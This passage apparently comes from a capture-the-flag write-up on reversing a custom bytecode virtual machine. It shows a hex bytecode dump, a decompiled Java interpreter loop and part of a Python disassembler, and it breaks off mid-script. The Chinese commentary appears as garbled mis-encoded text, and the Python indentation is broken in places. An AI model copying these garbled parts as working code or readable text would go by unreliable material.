class="number">6</span>B <span class="number">2</span>A <span class="number">03</span></span><br><span class="line"><span class="attribute">25</span> <span class="number">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">04</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">03</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span></span><br><span class="line"><span class="attribute">13</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">57</span> <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span></span><br><span class="line"><span class="attribute">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">1</span>A <span class="number">0</span>C <span class="number">02</span> <span class="number">54</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">04</span> <span class="number">0</span>C</span><br><span class="line"><span class="attribute">02</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">07</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">2</span>C <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">0</span>F <span class="number">0</span>C <span class="number">01</span> <span class="number">5</span>E <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F</span><br><span class="line"><span class="attribute">2A</span> <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">29</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">2</span>C <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">02</span> <span class="number">27</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">48</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">2</span>D <span class="number">0</span>C <span class="number">02</span></span><br><span class="line"><span class="attribute">4C</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span></span><br><span class="line"><span class="attribute">07</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">29</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">23</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">41</span> <span class="number">2</span>A</span><br><span class="line"><span class="attribute">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">2</span>C <span class="number">0</span>C</span><br><span class="line"><span class="attribute">02</span> <span class="number">48</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">04</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">03</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">68</span> <span class="number">2</span>A <span class="number">03</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">1</span>C</span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">5</span>B <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">7</span>B <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">46</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">54</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">43</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">73</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">72</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">75</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">65</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">74</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">61</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">6</span>D <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">61</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">2</span>B <span class="number">1</span>B</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºvmçš„åŸºæœ¬ç‰¹å¾ï¼Œå³ï¼š</p><p>ä¸€ä¸ªswitchåŠ ä¸€å †case<br>è¿™æ˜¯åœ¨åˆ¤æ–­è¿™ä¸€ä¸ªå­—èŠ‚çš„æŒ‡ä»¤æ˜¯ä»€ä¹ˆï¼Œç„¶åæ‰§è¡Œç›¸åº”æŒ‡ä»¤</p><p>æ‰€ä»¥ï¼Œç»™å‡ºäº†ç¨‹åºï¼Œæˆ‘ä»¬éœ€è¦é€†å‘æ¨¡æ‹Ÿå™¨æ¨å‡ºæ¯ä¸€ä¸ªæŒ‡ä»¤æ˜¯ä»€ä¹ˆæ„æ€ï¼Œç„¶åæŠŠæŒ‡ä»¤è¿˜åŸã€‚åŒæ—¶ï¼Œä¸€èˆ¬è¿˜ä¼šæ¨¡æ‹Ÿå¯„å­˜å™¨å’Œæ ˆç»“æ„æ¥è¯»å–æ•°æ®ï¼Œæ‰€ä»¥è¿˜è¦æ‰¾åˆ°è¿™ä¸¤ä¸ªç»“æ„æ‰å¥½ç†è§£ã€‚</p><p>æ‰€ä»¥ï¼ŒåŒ–ç®€ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; code.length) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (code[i]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> code[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b2</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> reg[b];</span><br><span class="line">                    reg[b] = reg[b2];</span><br><span class="line">                    reg[b2] = i3;</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b3</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b3] = reg[b3] + code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b4</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b4] = reg[b4] + reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b5</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b5] = reg[b5] - code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b6</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b6] = reg[b6] - reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b7</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b7] = reg[b7] * code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b8</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b8] = reg[b8] * reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b9</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b9] = reg[b9] / code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b10</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b10] = reg[b10] / reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b11</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b11] = reg[b11] % code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b12</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b12] = reg[b12] % reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b13</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b13] = reg[b13] &lt;&lt; code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b14</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b14] = reg[b14] &lt;&lt; reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">                    reg[code[i + <span class="number">1</span>]] = bufferedReader.read();</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    stack[i4] = bufferedReader.read();</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">                    System.out.print((<span class="type">char</span>) reg[code[i + <span class="number">1</span>]]);</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    System.out.print((<span class="type">char</span>) stack[i2]);</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">41</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b15</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b16</span> <span class="operator">=</span> code[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (reg[b15] == <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b16;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">42</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b17</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b18</span> <span class="operator">=</span> code[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (reg[b17] != <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b18;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">                    i = code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">52</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    stack[i5] = reg[code[i + <span class="number">1</span>]];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">53</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    reg[code[i + <span class="number">1</span>]] = stack[i2];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">54</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    stack[i6] = code[i + <span class="number">1</span>];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Byte.MAX_VALUE:</span><br><span class="line">                    bufferedReader.close();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b19</span> <span class="operator">=</span> code[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b20</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b21</span> <span class="operator">=</span> code[i + <span class="number">2</span>];</span><br><span class="line">                    code[i] = (<span class="type">byte</span>) ((code[i] ^ b20) ^ b21);</span><br><span class="line">                    code[i + <span class="number">1</span>] = (<span class="type">byte</span>) ((code[i] ^ b19) ^ b21);</span><br><span class="line">                    code[i + <span class="number">2</span>] = (<span class="type">byte</span>) ((code[i + <span class="number">1</span>] ^ b19) ^ b20);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>æ”¹å†™ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(code):</span><br><span class="line">b0 = code[i]</span><br><span class="line">b1 = code[i + <span class="number">1</span>] <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(code) <span class="keyword">else</span> <span class="number">0xff</span></span><br><span class="line">b2 = code[i + <span class="number">2</span>] <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(code) <span class="keyword">else</span> <span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> b0 == <span class="number">0</span> <span class="keyword">or</span> b0 == <span class="number">1</span> <span class="keyword">or</span> b0 == <span class="number">2</span> <span class="keyword">or</span> b0 == <span class="number">3</span>:</span><br><span class="line">fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    swap r<span class="subst">&#123;b0&#125;</span> r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">i += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> b0 == <span class="number">8</span>:</span><br><span class="line">fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> += b2\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">9</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> += r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">12</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> -= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">13</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> -= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">16</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> *= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">17</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> *= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">20</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> /= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">21</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> /= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">24</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> mod= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">25</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> mod= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">28</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    shl r<span class="subst">&#123;b1&#125;</span>, <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">29</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    shl r<span class="subst">&#123;b1&#125;</span>, r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">31</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    read r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">32</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    rdpush\n&quot;</span>)<span class="comment">#i2ä¸ºæ ˆé¡¶æŒ‡é’ˆ</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">33</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    print_write r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)<span class="comment">#åªæ‰“å°ä¸æ”¹å˜æ ˆ</span></span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">34</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    print_pop\n&quot;</span>)<span class="comment">#æ‰“å°åŠ å‡ºæ ˆ</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">41</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    jmp <span class="subst">&#123;b2&#125;</span> if !r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)<span class="comment">#è¿™é‡Œjmpé€šè¿‡ä¿®æ”¹iæ¥è·³è½¬</span></span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">42</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    jmp <span class="subst">&#123;b2&#125;</span> if r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span 